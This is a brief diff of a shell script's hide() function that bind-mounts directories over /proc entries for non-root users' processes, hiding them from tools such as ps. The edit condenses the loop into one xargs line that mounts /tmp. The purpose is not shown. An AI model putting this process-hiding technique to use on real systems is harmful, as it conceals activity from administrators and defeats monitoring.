@@ -24,10 +24,7 @@ hide(){
                 if [ $ALL == "root" ]; then
                         echo "skipping root user"; continue
                 fi
-                ps aux | grep $ALL | awk '{print $2}' > /tmp/.process
-                for PID in `cat /tmp/.process`; do
-                        mount -o bind /.empty/.dir /proc/$PID
-                done
+                ps aux | grep $ALL | awk -F' ' '{print $2}' | xargs -I{} mount -o bind /tmp /proc/{}
         done
 }
 run
